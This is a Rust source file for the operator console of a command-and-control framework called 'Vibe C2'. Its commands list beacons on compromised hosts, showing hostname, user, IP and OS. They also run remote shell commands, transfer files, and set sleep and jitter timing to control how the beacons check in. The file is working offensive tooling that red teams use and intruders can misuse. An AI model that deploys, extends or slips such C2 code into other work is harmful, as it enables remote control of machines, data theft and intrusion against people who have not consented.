use anyhow::{anyhow, Result};
use base64::Engine;
use clap::Parser;
use colored::*;
use vibe_c2::{BeaconInfo, Command, CommandResponse, CommandResult, Task, routes};
use std::io::{self, Write};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::mpsc;
use tracing::{info, Level};
use tracing_subscriber::FmtSubscriber;
use rustyline::error::ReadlineError;
use rustyline::{DefaultEditor, Result as RustylineResult};

/// Command line arguments for the Vibe C2 Operator Console
#[derive(Parser, Debug)]
#[command(author, version, about = "Vibe C2 Operator - Command interface for the Vibe C2 Framework", long_about = None)]
struct Args {
    /// Team server address
    #[arg(short, long, default_value = "http://localhost:8080")]
    server: String,
}

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    let subscriber = FmtSubscriber::builder()
        .with_max_level(Level::INFO)
        .finish();
    tracing::subscriber::set_global_default(subscriber)?;

    info!("Starting Vibe C2 Operator Console...");
    
    let args = Args::parse();
    let server_url = args.server;
    
    // Colorful banner
    println!("{}", "\n🌊  V I B E  C 2  F R A M E W O R K  🌊".bright_cyan().bold());
    println!("{}", "   Modern Command & Control Platform".cyan());
    println!("{} {}", "Connected to:".dimmed(), server_url.bright_blue().underline());
    println!("{} {} {}", "Type".dimmed(), "'help'".bright_green(), "for available commands".dimmed());
    println!("");
    
    let mut active_beacon: Option<String> = None;
    
    // Initialize rustyline for command history
    let mut rl = DefaultEditor::new()?;
    // Load history if it exists
    let history_path = std::path::PathBuf::from("vibe_history.txt");
    if history_path.exists() {
        if let Err(err) = rl.load_history(&history_path) {
            println!("Error loading history: {}", err);
        }
    }
    
    // Set up communication channel for prompt redisplay
    let (tx, mut rx) = mpsc::channel::<String>(10);
    *PROMPT_SENDER.lock().unwrap() = Some(tx.clone());
    
    // Create a static reference for the current prompt
    static CURRENT_PROMPT: once_cell::sync::Lazy<Mutex<String>> = 
        once_cell::sync::Lazy::new(|| Mutex::new(String::new()));
        
    // Spawn a task to monitor the prompt channel
    let prompt_monitor = tokio::spawn(async move {
        while let Some(_) = rx.recv().await {
            // Small delay to allow output to complete
            tokio::time::sleep(Duration::from_millis(100)).await;
            // Get the current prompt format
            let current_prompt = CURRENT_PROMPT.lock().unwrap().clone();
            // Create a clean line and print the prompt
            print!("\r\n{}", current_prompt);
            io::stdout().flush().unwrap();
        }
    });
    
    loop {
        // Display colorful prompt
        let prompt_text = match &active_beacon {
            Some(id) => format!("vibe {}", format!("[{}]", id).bright_red()),
            None => "vibe".to_string(),
        };
        let prompt = format!("{}{} ", prompt_text.bright_cyan().bold(), ">".cyan());
        
        // Store current prompt format for later redisplay
        *CURRENT_PROMPT.lock().unwrap() = prompt.clone();
        
        // Read command with history support
        let readline = rl.readline(&prompt);
        let input = match readline {
            Ok(line) => {
                // Add entry to history
                if !line.trim().is_empty() {
                    rl.add_history_entry(line.as_str())?;
                }
                line
            },
            Err(ReadlineError::Interrupted) => {
                // Ctrl-C
                println!("Interrupted");
                break;
            },
            Err(ReadlineError::Eof) => {
                // Ctrl-D
                println!("Exit");
                break;
            },
            Err(err) => {
                println!("Error: {:?}", err);
                break;
            }
        };
        
        let input = input.trim();
        
        if input.is_empty() {
            continue;
        }
        
        // Process command
        let parts: Vec<&str> = input.splitn(2, ' ').collect();
        let command = parts[0];
        let args = parts.get(1).unwrap_or(&"");
        
        match command {
            "help" => show_help(&active_beacon),
            "exit" | "quit" => break,
            "list" => list_beacons(&server_url).await?,
            "use" => {
                if args.is_empty() {
                    println!("Error: Beacon ID required");
                } else {
                    active_beacon = Some(args.to_string());
                    println!("Using beacon: {}", args);
                }
            }
            "info" => {
                if let Some(id) = &active_beacon {
                    show_beacon_info(&server_url, id).await?;
                } else if !args.is_empty() {
                    show_beacon_info(&server_url, args).await?;
                } else {
                    println!("Error: No active beacon. Select one with 'use <beacon_id>' or specify 'info <beacon_id>'");
                }
            }
            "shell" => {
                if let Some(id) = &active_beacon {
                    if args.is_empty() {
                        println!("Error: Command required");
                    } else {
                        send_command(&server_url, id, Command::Shell(args.to_string())).await?;
                    }
                } else {
                    println!("Error: No active beacon. Select one with 'use <beacon_id>'");
                }
            }
            "upload" => {
                if let Some(id) = &active_beacon {
                    let parts: Vec<&str> = args.splitn(2, ' ').collect();
                    if parts.len() != 2 {
                        println!("Error: Usage: upload <local_file> <remote_destination>");
                    } else {
                        upload_file(&server_url, id, parts[0], parts[1]).await?;
                    }
                } else {
                    println!("Error: No active beacon. Select one with 'use <beacon_id>'");
                }
            }
            "download" => {
                if let Some(id) = &active_beacon {
                    if args.is_empty() {
                        println!("Error: Usage: download <remote_file>");
                    } else {
                        send_command(&server_url, id, Command::Download { source: args.to_string() }).await?;
                    }
                } else {
                    println!("Error: No active beacon. Select one with 'use <beacon_id>'");
                }
            }
            "sleep" => {
                if let Some(id) = &active_beacon {
                    if args.is_empty() {
                        println!("Error: Sleep time (in seconds) required");
                    } else if let Ok(seconds) = args.parse::<u64>() {
                        send_command(&server_url, id, Command::Sleep { seconds }).await?;
                    } else {
                        println!("Error: Invalid sleep time. Must be a positive integer");
                    }
                } else {
                    println!("Error: No active beacon. Select one with 'use <beacon_id>'");
                }
            }
            "jitter" => {
                if let Some(id) = &active_beacon {
                    if args.is_empty() {
                        println!("Error: Jitter percentage (0-50) required");
                    } else if let Ok(percent) = args.parse::<u8>() {
                        if percent <= 50 {
                            send_command(&server_url, id, Command::Jitter { percent }).await?;
                        } else {
                            println!("Error: Jitter percentage must be between 0 and 50");
                        }
                    } else {
                        println!("Error: Invalid jitter percentage. Must be a number between 0 and 50");
                    }
                } else {
                    println!("Error: No active beacon. Select one with 'use <beacon_id>'");
                }
            }
            "terminate" => {
                if let Some(id) = &active_beacon {
                    println!("Are you sure you want to terminate beacon {}? (y/N) ", id);
                    io::stdout().flush()?;
                    
                    let readline = rl.readline("Confirm (y/N): ");
                    let confirm = match readline {
                        Ok(line) => line,
                        Err(_) => "n".to_string(),
                    };
                    if confirm.trim().to_lowercase() == "y" {
                        send_command(&server_url, id, Command::Terminate).await?;
                        active_beacon = None;
                    }
                } else {
                    println!("Error: No active beacon. Select one with 'use <beacon_id>'");
                }
            }
            _ => println!("Unknown command: {}. Type 'help' for available commands", command),
        }
    }
    
    // Save history
    if let Err(err) = rl.save_history(&history_path) {
        println!("Error saving history: {}", err);
    }
    
    // Close the prompt channel
    *PROMPT_SENDER.lock().unwrap() = None;
    
    println!("Exiting...");
    Ok(())
}

/// Display help information with color formatting
fn show_help(active_beacon: &Option<String>) {
    println!("{}", "\n📚 AVAILABLE COMMANDS".bright_blue().bold());
    println!("{}{} {}", "  ".blue(), "help".green().bold(), "                    - Show this help message".dimmed());
    println!("{}{} {} {} {}", "  ".blue(), "exit".green().bold(), ", ".dimmed(), "quit".green().bold(), "              - Exit the operator console".dimmed());
    println!("{}{} {}", "  ".blue(), "list".green().bold(), "                    - List all registered beacons".dimmed());
    println!("{}{} {}", "  ".blue(), "use <beacon_id>".green().bold(), "         - Set the active beacon".dimmed());
    println!("{}{} {}", "  ".blue(), "info [beacon_id]".green().bold(), "        - Show information about a beacon".dimmed());
    
    if active_beacon.is_some() {
        println!("{}", "\n⚡ BEACON COMMANDS".bright_red().bold());
        println!("{}{} {}", "  ".red(), "shell <command>".yellow().bold(), "          - Execute a shell command on the beacon".dimmed());
        println!("{}{} {}", "  ".red(), "upload <local> <remote>".yellow().bold(), " - Upload a file to the beacon".dimmed());
        println!("{}{} {}", "  ".red(), "download <remote>".yellow().bold(), "       - Download a file from the beacon".dimmed());
        println!("{}{} {}", "  ".red(), "sleep <seconds>".yellow().bold(), "         - Set beacon sleep time".dimmed());
        println!("{}{} {}", "  ".red(), "jitter <percent>".yellow().bold(), "        - Set randomness (0-50%) for sleep time".dimmed());
        println!("{}{} {}", "  ".red(), "terminate".yellow().bold(), "               - Terminate the beacon".dimmed());
    }
    println!("");
}

/// List all registered beacons with colorful formatting
async fn list_beacons(server_url: &str) -> Result<()> {
    let client = reqwest::Client::new();
    let response = client
        .get(format!("{}{}", server_url, routes::BEACONS))
        .send()
        .await?;
    
    if response.status().is_success() {
        let beacons: Vec<BeaconInfo> = response.json().await?;
        
        if beacons.is_empty() {
            println!("{}", "\n[i] No beacons registered".yellow().italic());
            return Ok(());
        }
        
        println!("{}", "\n🔍 REGISTERED BEACONS".bright_blue().bold());
        println!("{}", format!("{:<15} {:<20} {:<20} {:<15}", 
            "ID".cyan().bold(), 
            "HOSTNAME".cyan().bold(), 
            "USERNAME".cyan().bold(), 
            "LAST CHECK-IN".cyan().bold()));
        println!("{}", "─".repeat(70).dimmed());
        
        for beacon in beacons {
            let last_check_in = match beacon.last_check_in {
                Some(ts) => {
                    // Use DateTime::from_timestamp instead of the deprecated NaiveDateTime::from_timestamp_opt
                    let time = chrono::DateTime::<chrono::Utc>::from_timestamp(ts as i64, 0)
                        .unwrap_or_default()
                        .naive_local();
                    time.format("%Y-%m-%d %H:%M:%S").to_string()
                }
                None => "Never".to_string(),
            };
            
            // If beacon is terminated, grey it out; otherwise highlight active beacons
            if beacon.terminated {
                println!(
                    "{:<15} {:<20} {:<20} {:<15} {}",
                    beacon.id.dimmed(),
                    beacon.hostname.dimmed(),
                    beacon.username.dimmed(),
                    last_check_in.dimmed(),
                    "[TERMINATED]".red().dimmed()
                );
            } else {
                println!(
                    "{:<15} {:<20} {:<20} {:<15}",
                    beacon.id.bright_green().bold(),
                    beacon.hostname.bright_white(),
                    beacon.username.bright_white(),
                    if last_check_in == "Never" { last_check_in.red() } else { last_check_in.normal() }
                );
            }
        }
        println!("");
    } else {
        return Err(anyhow!("Failed to get beacons: {}", response.status()));
    }
    
    Ok(())
}

/// Show detailed information about a beacon with colorful formatting
async fn show_beacon_info(server_url: &str, beacon_id: &str) -> Result<()> {
    let client = reqwest::Client::new();
    let response = client
        .get(format!("{}{}", server_url, routes::BEACONS))
        .send()
        .await?;
    
    if response.status().is_success() {
        let beacons: Vec<BeaconInfo> = response.json().await?;
        
        if let Some(beacon) = beacons.iter().find(|b| b.id == beacon_id) {
            println!("{}", "\n🌊 BEACON DETAILS".bright_blue().bold());
            println!("{}{}", "  ID:             ".cyan(), beacon.id.bright_green().bold());
            println!("{}{}", "  Hostname:       ".cyan(), beacon.hostname.bright_white());
            println!("{}{}", "  Username:       ".cyan(), beacon.username.bright_white());
            println!("{}{}", "  IP Address:    ".cyan(), 
                                  beacon.ip.bright_white());
            println!("{}{}", "  OS:            ".cyan(), 
                                  beacon.os.bright_white());
            println!("{}{}", "  Sleep Time:    ".cyan(), 
                                  format!("{} seconds", beacon.sleep_time.as_secs()).yellow());
            println!("{}{}", "  Status:        ".cyan(), 
                                  if beacon.terminated {
                                      "TERMINATED".red().bold()
                                  } else {
                                      "ACTIVE".green().bold()
                                  });
            
            if let Some(ts) = beacon.last_check_in {
                // Use DateTime::from_timestamp instead of the deprecated NaiveDateTime::from_timestamp_opt
                let time = chrono::DateTime::<chrono::Utc>::from_timestamp(ts as i64, 0)
                    .unwrap_or_default()
                    .naive_local();
                println!("{}{}", "  Last Check-in:  ".cyan(), 
                                  time.format("%Y-%m-%d %H:%M:%S").to_string().bright_white());
            } else {
                println!("{}{}", "  Last Check-in:  ".cyan(), "Never".red());
            }
            println!("");
            return Ok(());
        }
        
        return Err(anyhow!("{}\n", format!("⚠️ Beacon not found: {}", beacon_id).red().bold()));
    }
    
    Err(anyhow!("{}\n", format!("⚠️ Failed to get beacons: {}", response.status()).red().bold()))
}

/// Send a command to a beacon with colorful status messages
async fn send_command(server_url: &str, beacon_id: &str, command: Command) -> Result<()> {
    // Clone the command before moving it
    let command_clone = command.clone();
    
    let client = reqwest::Client::new();
    let response = client
        .post(format!("{}{}", server_url, routes::TASKS))
        .json(&(beacon_id.to_string(), command_clone))
        .send()
        .await?;
    
    if response.status().is_success() {
        let task: Task = response.json().await?;
        println!("{} {}", "✅ Task created:".green().bold(), task.id.bright_white());
        println!("{}", "   The beacon will execute this command on its next check-in".dimmed());
        
        // Display command info
        match &command {
            Command::Shell(cmd) => {
                println!("{} {}", "🖥️ Executing command:".yellow().bold(), cmd.bright_white());
            },
            Command::Upload { destination, .. } => {
                println!("{} {}", "📤 Uploading file to:".yellow().bold(), destination.bright_white());
            },
            Command::Download { source } => {
                println!("{} {}", "📥 Downloading file:".yellow().bold(), source.bright_white());
            },
            Command::Sleep { seconds } => {
                println!("{} {}", "⏱️ Setting sleep time:".yellow().bold(), format!("{} seconds", seconds).bright_white());
            },
            Command::Jitter { percent } => {
                println!("{} {}", "🎲 Setting jitter:".yellow().bold(), format!("{} percent", percent).bright_white());
            },
            Command::Terminate => {
                println!("{}", "🛑 Terminating beacon".yellow().bold());
            },
        }
        
        // Start polling for responses in the background
        let prompt_sender = PROMPT_SENDER.lock().unwrap().clone();
        tokio::spawn(poll_for_responses(
            server_url.to_string(), 
            beacon_id.to_string(), 
            task.id.clone(),
            prompt_sender
        ));
        
        Ok(())
    } else {
        Err(anyhow!("{}\n", format!("⚠️ Failed to create task: {}", response.status()).red().bold()))
    }
}

// Global channel for prompt redisplay
static PROMPT_SENDER: once_cell::sync::Lazy<Mutex<Option<mpsc::Sender<String>>>> = 
    once_cell::sync::Lazy::new(|| Mutex::new(None));

/// Poll for responses to a specific command with colorful output
async fn poll_for_responses(
    server_url: String, 
    beacon_id: String, 
    task_id: String,
    prompt_sender: Option<mpsc::Sender<String>>
) {
    // Wait a moment for the beacon to check in and execute the command
    tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    
    let client = reqwest::Client::new();
    let mut attempt = 0;
    const MAX_ATTEMPTS: u32 = 15; // Poll for up to ~30 seconds
    
    while attempt < MAX_ATTEMPTS {
        // Try to get responses
        match client
            .post(format!("{}{}", server_url, routes::GET_RESPONSES))
            .json(&beacon_id)
            .send()
            .await
        {
            Ok(response) => {
                if response.status().is_success() {
                    match response.json::<Vec<CommandResponse>>().await {
                        Ok(responses) => {
                            // Filter for the specific task
                            if let Some(resp) = responses.iter().find(|r| r.id == task_id) {
                                println!("{} {}", "\n📥 RESPONSE FROM BEACON".blue().bold(), 
                                               beacon_id.bright_blue());
                                println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".dimmed());
                                
                                match &resp.result {
                                    CommandResult::Success(output) => {
                                        // Print command output with nice formatting
                                        if output.contains("Error") || output.contains("error") || output.contains("failed") {
                                            // Highlight errors in red
                                            println!("{}", output.red());
                                        } else {
                                            println!("{}", output.bright_white());
                                        }
                                        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".dimmed());
                                        
                                        // Signal to redisplay the prompt
                                        if let Some(sender) = &prompt_sender {
                                            let _ = sender.send(String::new()).await;
                                        }
                                        return;
                                    },
                                    CommandResult::Error(err) => {
                                        println!("{} {}", "⚠️ ERROR:".red().bold(), err.bright_red());
                                        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".dimmed());
                                        
                                        // Signal to redisplay the prompt
                                        if let Some(sender) = &prompt_sender {
                                            let _ = sender.send(String::new()).await;
                                        }
                                        return;
                                    },
                                    CommandResult::FileData(data) => {
                                        println!("{} {}", "📁 FILE DATA:".green().bold(), 
                                                         format!("Received {} bytes", data.len()).bright_green());
                                        println!("{}", "   In a complete implementation, this would be saved to disk.".dimmed());
                                        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".dimmed());
                                        
                                        // Signal to redisplay the prompt
                                        if let Some(sender) = &prompt_sender {
                                            let _ = sender.send(String::new()).await;
                                        }
                                        return;
                                    }
                                }
                            }
                        },
                        Err(_) => {}
                    }
                }
            },
            Err(_) => {}
        }
        
        // Wait before trying again
        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
        attempt += 1;
    }
    
    println!("{}", "\n⏱️ No response received within timeout period. The beacon may not have checked in yet.".yellow().italic());
    
    // Signal to redisplay the prompt
    if let Some(sender) = &prompt_sender {
        let _ = sender.send(String::new()).await;
    }
}

/// Upload a file to a beacon
async fn upload_file(server_url: &str, beacon_id: &str, local_path: &str, remote_path: &str) -> Result<()> {
    use std::fs;
    
    // Read the local file
    let data = fs::read(local_path)?;
    let encoded = base64::engine::general_purpose::STANDARD.encode(data);
    
    // Create upload command
    let command = Command::Upload {
        data: encoded,
        destination: remote_path.to_string(),
    };
    
    // Send the command
    send_command(server_url, beacon_id, command).await
}
